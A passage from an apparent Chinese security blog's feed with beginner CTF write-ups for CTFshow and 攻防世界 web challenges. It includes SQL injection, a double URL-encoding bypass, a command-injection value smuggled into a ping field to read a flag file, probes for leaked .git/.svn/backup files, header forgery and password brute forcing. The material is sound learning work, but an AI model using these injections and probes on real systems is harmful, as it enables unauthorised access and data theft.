class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>第1个if语句：要求不能直接在url栏输入admin，否则不予通过。<br>第2个if语句：url解码后的值要与admin相同。</p></li><li><p>构造语句<br>url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。<br>因此我们将a进行url编码，可得到%61dmin<br>解码后与admin值相同。<br>但这样还不够，因为url栏会先对传上的值解一次码，变成admin，这样在判断第1个if语句时仍然无法通过。<br>因此我们需要二次编码绕过。将%61再次进行编码：%2561<br>最终得到： <code>%2561dmin</code><br>最后拿到flag</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一道很简单的题，但我因为基础不牢，导致做不出来。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW_web入门_SQL注入</title>
    <link href="http://example.com/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-12-12T16:00:00.000Z</published>
    <updated>2022-12-13T17:17:21.507Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>web172<br>打开F12，发现js，访问后，发现最后几行代码有关于输入的部分，于是随手输入一个：<br><code>url/api/?id=1</code><br>发现显示出数据，于是先构造一个：<br><code>url/api/?id=1&#39;or 1=1 --+</code><br>得到全部数据，但我们翻到最下面，显示flag不在这里，那说明flag应该是在另一个表里，于是进行常规注入，最后在ctfshow_user2的表里发现了flag。 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;p&gt;web172&lt;br&gt;打开F12，发现js，访问后，发现最后几行代码有关于输入的部分，于是随手输入一个：&lt;br&gt;&lt;code&gt;url/api/?id=1&lt;/code&gt;&lt;br&gt;发现显示出数据，于是先构造一个：&lt;br&gt;&lt;code&gt;ur</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="SQL注入" scheme="http://example.com/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW_WEB入门_信息搜集</title>
    <link href="http://example.com/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://example.com/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2022-12-12T16:00:00.000Z</published>
    <updated>2022-12-13T12:40:47.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仍然是新手入门题，继续来训练自己的基础了。这一篇主要是训练的信息搜集部分。有些相似的内容在攻防世界新手篇中有的不会再写，选择性的写有遗漏的部分。</p><span id="more"></span><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p><strong>考点: 前台JS绕过</strong><br>这一题无法鼠标右键查看源代码，也无法按下F12。<br>题目明示了是js前端拦截，那么我们有三种方法：</p><ol><li><p>不断刷新，不断按F12<br>实际上是一种条件竞争的方式</p></li><li><p>view-source:url<br>在url之前加上view-source</p></li><li><p>下载源码，比如按下CTRL+S<br>下载后即可查看</p></li></ol><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><strong>考点: phps源码泄露</strong><br>提示源码泄露<br>直接在url后面加上<br><code>/index.phps</code><br>然后弹出下载框，下载后打开，发现flag</p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><strong>考点: 源码压缩包泄露</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">网站备份压缩文件 漏洞成因</span><br><span class="line">在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。</span><br><span class="line">当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</span><br><span class="line">该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。</span><br><span class="line">该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。</span><br><span class="line">被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</span><br><span class="line">.rar .zip .7z .tar.gz .bak .swp .txt</span><br></pre></td></tr></table></figure><p>提示解压源码到当前目录。<br>一番折腾后，终于搞清楚做法：<br><code>url/www.zip</code><br>下载后解压打开txt文件，拿到flag</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p><strong>考点: Git泄露</strong><br>题目描述： 版本控制很重要，但不要部署到生产环境更重要。<br>根据提示版本控制，想到常用的版本控制工具git，svn，尝试访问.git和.svn，在.git中发现flag<br>这里是 .git 源码泄露。<br>是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。<br>访问 <code>url/.git/</code><br>得到flag</p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><strong>考点: SVN泄露</strong><br>与web7类似，<br>这里是 SVN 导致文件泄露。<br>Subversion ，简称 SVN ，是一个开放源代码的版本控制系统，它的设计目标是取代 CVS 。<br>访问 <code>url/.svn</code><br>得到flag</p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><strong>考点: vim临时文件泄露</strong><br>题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了<br>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br>vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn<br><a href="https://www.runoob.com/linux/linux-vim.html">vim</a></p><p>因此，访问 <code>url/index.php.swp</code><br>得到flag</p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p><strong>考点: 域名txt记录泄露</strong><br>题目描述：域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息<br>根据提示，我们可以去查找该域名，比如打开<a href="https://boce.aliyun.com/home">网络诊断分析</a><br>查找后在“DNS检查”下发现TXT，得到flag</p><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><strong>考点: 敏感信息公布</strong><br>题目描述：有时候网站上的公开信息，就是管理员常用密码<br>打开页面，发现最底部的一串数字，根据提示，估计就是密码了。<br>然后在url后面添加admin： <code>url/admin</code><br>进入管理员后台账户，账号即为admin，密码是刚才那串数字。<br>得到flag</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><strong>考点: 内部技术文档泄露</strong><br>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码<br>查看底部的 document<br>点击后会出现一个pdf文件，上面写着登录地址和账号密码。<br>打开后即可得到flag</p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p><strong>考点: 编辑器配置不当</strong><br>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>首先根据提示，访问： <code>url/editor</code><br>这个界面具有编辑提交功能<br>我们点击图片上传或文件上传<br>可以看到目录，<br>查找 <code>/var/www/html/nothinghere/fl000g.txt</code><br>可以得到我们需要的文件，然后在url栏输入：<br><code>url/nothinghere/fl000g.txt</code><br>得到flag<br>这一题的关键在于没有经验很难找到关键文件，一般在www目录下会有关键信息。</p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p><strong>考点: 密码逻辑脆弱</strong><br>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果<br>根据提示，拿到了公开的邮箱，<br>然后登录后台 <code>url/admin</code><br>随便输入一个密码无法登录，发现有个忘记密码选项，于是点击忘记密码，发现需要输入居住城市。于是我们想到了刚才那个邮箱，搜索QQ发现qq上的城市为西安，输入西安，密码重置。再次登录，获得flag<br>这一题提示我们要更灵活一点，善于利用信息！</p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p><strong>考点: 探针泄露</strong><br>题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><ul><li>PHP探针:<br>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针。<br>根据探针的提示，我们可以访问： <code>url/tz.php</code><br>进入探针界面，然后发现界面有一个phpinfo，我们点进去，用CTRL+F，搜索ctf，找到flag</li></ul><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><p><strong>考点：sql备份文件泄露</strong><br>题目描述：备份的sql文件会泄露敏感信息<br>根据提示，我们访问： <code>url/backup.sql</code><br>弹出下载框，下载后打开，找到flag</p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p><strong>考点: js敏感信息泄露</strong><br>题目描述：不要着急，休息，休息一会儿，玩101分给你flag<br>直接打开F12，看到有一个js文件，我们直接加在url后面：<br><code>url/js/Flappy_js.js</code><br>打开后发现了一段unicode代码，我们解码成中文后，发现提示是110.php<br>于是将该php加在url后面：<br><code>url/110.php</code><br>得到flag</p><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p><strong>考点: 前端密钥泄露</strong><br>题目描述：密钥什么的，就不要放在前端了<br>根据描述，发现前端验证，直接抓包，将验证内容输入到包里再发送<br>成功拿到flag</p><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p><strong>考点: 数据库恶意下载</strong><br>题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。<br>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加 <code>/db/db.mdb</code> 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag<br>得到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>通过这次信息收集的训练，我又进步了一点点~</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_46150940/article/details/113788511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-113788511-blog-116881655.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-113788511-blog-116881655.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">CTFshow-Web入门-信息泄露</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;仍然是新手入门题，继续来训练自己的基础了。这一篇主要是训练的信息搜集部分。有些相似的内容在攻防世界新手篇中有的不会再写，选择性的写有遗漏的部分。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="信息搜集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界_Web新手练习区</title>
    <link href="http://example.com/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_Web%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>http://example.com/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_Web%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2022-12-10T16:00:00.000Z</published>
    <updated>2022-12-12T09:32:32.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是攻防世界一些比较简单的题，算是用来补充知识的。</p><span id="more"></span><h1 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h1><p>直接按下F12，从Elements中找到flag</p><h1 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h1><p>首先根据要求在搜索框后加上： <code>/?a=1</code>  然后提交<br>之后根据要求，先抓包，然后将首部的GET请求改为POST请求<br>再在下面添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">b=2</span><br></pre></td></tr></table></figure><p>即可拿到flag</p><p>关于post的更多知识可以看：<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data">GET&amp;POST</a></p><h1 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h1><p>直接在url后面加上：<br><code>/robots.txt</code><br>然后把获得的php文件名加在url后面，即可拿到flag</p><h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><p>需要寻找index.php的备份文件，那么常见的备份文件后缀：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar, tae.gz, zip, rar, bak, dat, txt, log, mdb, bz2, tar.bz2, 7z</span><br></pre></td></tr></table></figure><p>常见的网站源码备份文件名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web, website, backup, back, www, wwwroot, temp</span><br></pre></td></tr></table></figure><p>更详细的解释可以看看：<a href="https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/">备份文件</a><br>bak是自动创建的备份文件，因此首先尝试，出现下载框，下载后记事本方式打开，得到flag</p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>明示了与cookie相关，所以我们直接查看cookie，发现指示我们打开cookie.php页面，打开后又发现页面写着看http response，所以我们抓包后，send to repeater，看响应，最终拿到flag</p><h1 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h1><p>不能按的按钮，那我们直接按下F12检查页面，发现在按钮处有个disabled。<br>这里浏览器之间有个有趣的小差别：<br>FireFox是直接删除disabled元素即可显示flag<br>chrome需要把disabled改为enabled才能显示flag</p><h1 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h1><p>打开后有一个输入密码的弹窗，没什么用。<br>按下F12查看元素，发现有一段script代码，我们仔细查看，发现一串可疑的16进制数据。<br>将16进制数据拿去转码为10进制，再通过python的一段代码编写（s数组内即为转码后的10进制数据）：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>成功得到flag。</p><h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h1><ul><li>xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。<br>格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</li><li>referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</li></ul><p>题目明示伪造xff和referer，那么我们直接打开页面抓包，在包的首部添加字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://www.google.com</span><br><span class="line">X-Forwarded-for:123.123.123.123</span><br></pre></td></tr></table></figure><p>即可得到flag</p><h1 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h1><p>这一关用到了弱口令爆破。<br>但其实之前我并没有学这个知识，所以一开始很迷惑，但还好，这部分知识并不复杂。<br>是一个登录界面，直接抓包。<br>抓包后发送到Intruder。看到Positions，我们会发现需要爆破的地方被用另一种颜色涂抹了，由于只需要爆破密码。所以把其它位置的$符号去掉，只保留密码处的，然后用户名是admin。<br>之后看到Payloads那里，我们需要一个字典来爆破，这样会比较高效。在Payload Options处导入我们准备好的字典后，直接开始攻击。<br>很快，我们发现payloads为123456处那里的字段长度与别的不同，我们检查这个包，发现response里面就有flag。</p><h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h1><p>这一关打开是一个ping命令，然后结合题目信息，我们可以从远程命令执行入手（RCE）。<br>那么Windows远程命令常用的有 <code>&amp;  &amp;&amp;  |  ||</code><br>随便用那个都行，直接输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure><p>可以找到一个名为 <code>flag.txt</code>  的文件，于是我们可以执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; cat /home/flag.txt</span><br></pre></td></tr></table></figure><p>即可得到flag</p><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>本题的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题主要是考察对php的熟悉程度，虽然不难，但基础不好也容易掉入陷阱。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source show_source() 函数对文件进行语法高亮显示,是 highlight_file() 的别名</span><br><span class="line">include include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中</span><br></pre></td></tr></table></figure><p>代码搞清楚后，那么接下来看如何处理<br>要求是以get方式传入a,b参数，</p><ul><li>a的要求<br>值为0，且参数a本身不为flase<br>那么不能为数字0，因为会被解析为false<br>而我们知道字符型数据会被转化为0与数字比较，<br>因此随便填个字符即可满足要求</li><li>b的要求<br>不能为数字，且值要大于1234<br>那么直接来个2345a</li></ul><p>所以最终结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=a&amp;b=2345a</span><br></pre></td></tr></table></figure><p>即可拿到flag</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次总共11道题，每道题都非常简单，主要是考察基础知识，对于新手而言还是很有帮助的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>正是简单才看出基础。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这是攻防世界一些比较简单的题，算是用来补充知识的。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界_easyphp</title>
    <link href="http://example.com/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/"/>
    <id>http://example.com/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</id>
    <published>2022-12-10T16:00:00.000Z</published>
    <updated>2022-12-11T10:04:54.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p><span id="more"></span><h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界-&gt;easyphp</p><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>首先是页面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ol><li><p>查看传参类型以及数量<br>我们通看整个页面，发现需要传a,b,c三个参数，且均以GET方式传递。</p></li><li><p>参数a的要求<br>我们重点看这段源代码：<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 